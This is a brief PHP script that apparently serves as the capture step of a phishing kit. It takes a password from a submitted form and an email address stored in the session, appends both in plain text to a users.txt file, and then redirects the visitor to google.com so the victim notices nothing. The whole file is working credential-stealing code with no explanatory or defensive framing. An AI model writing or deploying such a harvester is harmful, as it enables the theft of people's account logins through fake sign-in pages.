<?php

session_start();


$clave = $_POST["password"];
$username=$_SESSION["Email"];


file_put_contents("users.txt", "\n"."Account: ".$username."\r\n"."Pass: ".$clave."\n"."\n"."####################"."\n", FILE_APPEND);
echo "<meta http-equiv='refresh' content='1;url=https://www.google.com/'>  ";
exit();

session_destroy();
?>
